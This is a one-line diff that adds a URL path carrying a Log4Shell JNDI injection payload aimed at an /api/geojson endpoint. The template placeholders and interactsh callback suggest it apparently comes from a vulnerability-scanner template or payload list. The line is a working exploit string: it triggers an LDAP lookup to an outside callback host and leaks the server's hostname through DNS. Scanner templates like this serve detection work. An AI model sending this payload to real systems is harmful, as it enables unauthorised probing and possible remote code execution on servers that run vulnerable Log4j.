@@ -1,0 +1,1 @@
+/api/geojson?url=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.url.{{interactsh-url}}}
